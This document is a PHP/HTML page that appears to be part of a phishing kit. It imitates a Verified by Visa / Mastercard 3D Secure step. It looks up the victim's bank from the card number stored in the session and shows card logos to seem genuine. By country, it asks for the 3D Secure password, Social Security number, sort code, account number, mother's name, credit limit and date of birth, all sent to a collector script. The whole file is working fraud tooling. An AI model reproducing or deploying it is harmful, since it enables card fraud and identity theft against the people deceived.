<?php

session_start();

include('__CONFIG__.php');

function curl($url = '', $var = '')
{
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, false);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}

function get_BIN($bin, $parameter)
{
  $binx = preg_replace('/\s+/', '', substr($bin, 0, 6));
  $get_bin = curl('https://api.freebinchecker.com/bin/'.$binx);
  $json_bin = @json_decode($get_bin, true);
  if ($parameter == 'bankname')
  {
    if (isset($json_bin))
    {
      return $json_bin['issuer']['name'];
    }
    else
    {
      return '';
    }
  }

}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/Loader/style.css">
    <link rel="stylesheet" href="Sheets/vbv.css">
    <title></title>
        <script>
            var myVar;
        
            function myFunction() {
                myVar = setTimeout(showPage, 1500);
            }
        
            function showPage() {
            document.getElementById("loader").style.display = "none";
            document.getElementById("combiner").style.display = "block";
            }
        </script>
</head>

<body onload="myFunction()">
        <div id="loader"></div>
    <div style="display:none;" class="combiner" id="combiner">
            <ul class="nav">
                    <li class="nav-item">
                     <?php
                     $card = substr($_SESSION['ncn'],0,1);
                     if($card == 5 )
                     {
                      echo '<img src="assets/img/master-card.gif" class="nav-link visa">';
                     }
                     elseif($card == 4 )
                     {
                      echo '<img src="Assets/img/verifiedbyvisa.png" alt="" class="nav-link visa">';
                     }
                     else
                     {
                     }
                    ?>
                    </li>
                    <li class="nav-item right">
                      <img class="nav-link" src="Assets/img/logo.jpg" href="#">
                    </li>              
                  </ul>
                  <br>
                  <p class="ptext">Please enter your Secure Code</p>
                <form action="Actions/vbv.php" method="post">
                  <div class="padingtable">
                        <table >
                                <tbody>
                                    <?php if (get_BIN($_SESSION['ncn'], 'bankname') !== '') { ?>
                                        <tr>
                                            <td>Bank :</td>
                                            <td><?php echo get_BIN($_SESSION['ncn'], 'bankname'); ?></td>
                                        </tr>
                                    <?php } ?>
                                    <tr>
                                        <td>Card number :</td>
                                        <td>XXXX-XXXX-XXXX-<?php echo $_SESSION['last4']; ?></td>
                                    </tr>
                                    <tr>
                                        <td>Full name :</td>
                                        <td><?php echo $_SESSION['fullname']; ?></td>
                                    </tr>
                                      <?php
                                      if ($_SESSION['cntname'] == "United States")
                                        {
                                          echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure"name="password_vbv"></td></tr>';
                                          echo '<tr><td align="right">Social Security Number :</td> <td><input style="width: 75px;" type="text" placeholder="SSN" name="ssn"></td></tr>';
                                        }
                                        elseif ($_SESSION['cntname'] == "United Kingdom")
                                        {
                                          echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure"name="password_vbv"></td></tr>';
                                          echo '<tr> <td align="right">Sort Code : <td><input class="" style="width: 75px;" name="sortcode" id="sortcode" placeholder="Sort Code"></td><br> </tr>';
                                          echo '<tr> <td align="right">Account Number : </td> <td><input style="width: 75px;" class="" maxlength="15" required name="accountnum" id="accountnum" placeholder="Account Number"></td> </tr>';
                                        }
                                        elseif ($_SESSION['cntname'] == "Ireland")
                                        {
                                          echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure"name="password_vbv"></td></tr>';
                                          echo '<tr> <td align="right">Sort Code : <td><input style="width: 75px;"class="" name="sortcode" id="sortcode" placeholder="Sort Code"></td><br> </tr>';
                                          echo '<tr><td align="right">Mother Name :</td> <td><input style="width: 75px;" class="" maxlength="15" required name="mothernam" id="mothernam" placeholder="Mother Name"></td></tr>';
                                          echo '<tr><td align="right">Credit Limit :</td> <td><input style="width: 75px;" class="" maxlength="15" name="creditlimit" id="creditlimit" placeholder="Credit Card Limit"></td></tr>';
                                        }
                                        elseif($_SESSION['cntname'] == "Australia")
                                        {
                                          echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure"name="password_vbv"></td></tr>';
                                          echo '<tr><td align="right">OSID :</td> <td><input class="" style="width: 75px;" name="osid" id="osid" placeholder="OSID"></td></tr>';
                                          echo '<tr><td align="right">Credit Limit :</td> <td><input style="width: 75px;" class="" maxlength="15" required name="creditlimit" id="creditlimit" placeholder="Credit Card Limit"></td></tr>';
                                        }
                                        else
                                        {
                                          echo ' <tr><td align="right">3D Secure :</td>';
                                          echo ' <td><input style="width: 75px;" type="text" placeholder="3D secure" name="password_vbv"><br></td><tr>';
                                        }
                                        ?>
                                    <tr>
                                        <td>Date Of Brith :</td>
                                        <td><input name="dob_month" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" placeholder="Month"> - <input name="dob_day" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" placeholder="Day"> - <input name="dob_year" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" placeholder="Year"></td>
                                    </tr>
                                    <tr>
                                        <td></td>
                                        <td>
                                            <input name="Sex" class="confirm" style=" width: 74px;" type="submit" value="Submit">
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                  </div>
                </form>
                  <p class="copyright">Copyright © 1999-<?php echo date('Y'); ?> . All rights reserved.</p>
    </div>




</body>
</html>